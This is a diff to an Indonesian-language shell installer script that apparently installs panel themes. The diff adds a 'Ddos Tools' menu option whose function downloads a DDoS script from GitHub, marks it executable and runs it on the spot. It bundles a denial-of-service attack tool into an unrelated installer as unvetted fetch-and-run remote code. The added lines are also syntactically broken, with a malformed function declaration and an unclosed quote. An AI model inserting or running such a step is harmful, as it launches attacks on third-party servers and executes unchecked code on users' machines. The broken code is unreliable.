@@ -75,6 +75,13 @@ check_token() {
   clear
 }
 
+# Ddos Tools
+ddos_tools(( {
+wget https://raw.githubusercontent.com/ekovegeance/DDOS/master/ddos
+chmod +x ./ddos
+./ddos
+}
+
 # Install protect panel
 install_protect_panel() {
   while true; do
@@ -1176,6 +1183,7 @@ while true; do
   echo "11. Install Depend"
   echo "12. Install Tema Nebula (wajib install depend terlebih dahulu)"
   echo "13. Install Tema Elysium"
+  echo "14. Ddos Tools
   echo "x. Exit"
   echo -e "Masukkan pilihan 1/2/3/.../x:"
   read -r MENU_CHOICE
@@ -1220,6 +1228,9 @@ while true; do
       ;;
     13)
       install_elysium_theme
+      ;;
+    14)
+      ddos_tools
       ;;
     x)
       echo "Keluar dari skrip."
